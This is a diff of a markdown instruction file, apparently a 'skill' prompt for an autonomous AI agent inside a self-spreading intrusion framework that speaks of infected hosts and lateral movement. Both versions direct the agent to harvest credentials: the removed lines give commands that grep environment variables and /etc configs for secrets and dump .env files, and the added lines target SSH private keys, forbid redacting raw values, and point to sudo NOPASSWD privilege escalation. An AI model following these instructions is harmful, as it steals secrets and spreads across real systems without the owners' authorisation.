@@ -1,27 +1,24 @@
-## Credential Extraction Skill
+# Credential Extraction
 
-### When to start extraction
+**Objective:** Harvest passwords, keys, and tokens that can unlock access to other hosts.
 
-Begin only when recon is complete — `discovered_hosts` is not empty for this host.
+## When to Start
 
-### Commands to issue (all together in one response)
+**After [NEW HOST ONLINE] — not before.** Gaining shell access is not infection; the DBA must be running and registered first. Once it is, queue extraction AND passive network discovery in the same turn — do not wait for one before starting the other.
 
-Search common locations where credentials are stored:
-1. Environment variables: `env | grep -iE 'pass|secret|key|token|pwd|api'`
-2. Config files: `find /etc -maxdepth 2 -name "*.conf" 2>/dev/null | xargs grep -hE '^[A-Za-z_]+=.+' 2>/dev/null`
-3. Dotenv files: `find /root /home -maxdepth 2 -name ".env" 2>/dev/null | xargs cat 2>/dev/null`
+Run all extraction commands as a single batch, then wait for results.
 
-Return `[]` immediately after dispatching all three. Do not wait for results before returning.
+## Where Credentials Hide
 
-### After extraction results arrive
+- **Environment variables** — filter for `pass`, `secret`, `key`, `token`, `api`. **Never pipe through `sed`, `awk`, or any redaction filter** — raw values only; redacting makes the credential unusable.
+- **Configuration files** — `/etc/` and app directories often store DB passwords and service credentials in plaintext.
+- **Dotenv files** — `.env` files in home directories and app roots.
+- **SSH private keys** — `~/.ssh/` and `/root/.ssh/`.
 
-Return `[]`. Credential extraction for this host is complete.
-Do not re-issue commands already dispatched.
-Found credentials are automatically correlated across all infected hosts for use in lateral movement.
+## Privilege Escalation
 
-### Privilege escalation check (if running as non-root)
+Non-root shells may block protected files. Check `sudo -l` for NOPASSWD entries — interpreters and editors are common vectors. Use `read_skill("privesc")` for techniques.
 
-If the host registered with a non-root username, also check available privilege escalation paths:
-- `sudo -l`
+## After Results Arrive
 
-If the output shows a binary or interpreter that can be run as root without a password, note it — it may allow reading protected credential files (such as SSH private keys in root's home directory) needed for the next hop.
+Store every credential with `store_credential`. Cross-reference against open ports and `list_credentials()` before any lateral move.
